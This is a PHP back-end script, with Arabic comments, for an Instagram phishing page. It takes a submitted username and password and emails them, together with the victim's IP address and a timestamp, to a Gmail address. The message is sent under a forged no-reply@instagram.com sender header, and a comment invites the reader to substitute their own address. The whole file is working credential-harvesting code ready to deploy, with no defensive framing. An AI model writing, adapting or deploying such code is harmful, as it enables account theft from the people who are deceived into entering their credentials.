<?php
header('Content-Type: application/json; charset=utf-8');

// التحقق من أن الطلب POST
if($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// استقبال البيانات
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

// التحقق من وجود البيانات المطلوبة
if(empty($username) || empty($password)) {
    echo json_encode(['error' => 'البيانات ناقصة']);
    exit;
}

// إعداد البريد الإلكتروني
$to = 'bbbbtvd1@gmail.com'; // استبدل ببريدك الحقيقي
$subject = 'تسجيل دخول جديد - إنستجرام';
$ip_address = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');

// بناء محتوى البريد
$message = "
<html dir='rtl'>
<head>
    <title>تفاصيل تسجيل الدخول</title>
    <style>
        body { font-family: Arial, sans-serif; }
        table { border-collapse: collapse; width: 100%; }
        th, td { padding: 10px; text-align: right; border: 1px solid #ddd; }
        th { background-color: #fafafa; }
    </style>
</head>
<body>
    <h2 style='color: #0095f6;'>بيانات تسجيل الدخول الجديدة</h2>
    <table>
        <tr><th>اسم المستخدم:</th><td>$username</td></tr>
        <tr><th>كلمة السر:</th><td>$password</td></tr>
        <tr><th>تاريخ التسجيل:</th><td>$date</td></tr>
        <tr><th>عنوان IP:</th><td>$ip_address</td></tr>
    </table>
</body>
</html>
";

// إعداد رأس البريد
$headers = [
    'MIME-Version: 1.0',
    'Content-type: text/html; charset=utf-8',
    'From: no-reply@instagram.com',
    'X-Mailer: PHP/' . phpversion()
];

// محاولة إرسال البريد
try {
    $mailSent = mail($to, $subject, $message, implode("\r\n", $headers));
    
    if($mailSent) {
        echo json_encode(['success' => true]);
    } else {
        throw new Exception('فشل إرسال البريد');
    }
} catch(Exception $e) {
    echo json_encode(['error' => $e->getMessage()]);
}
?>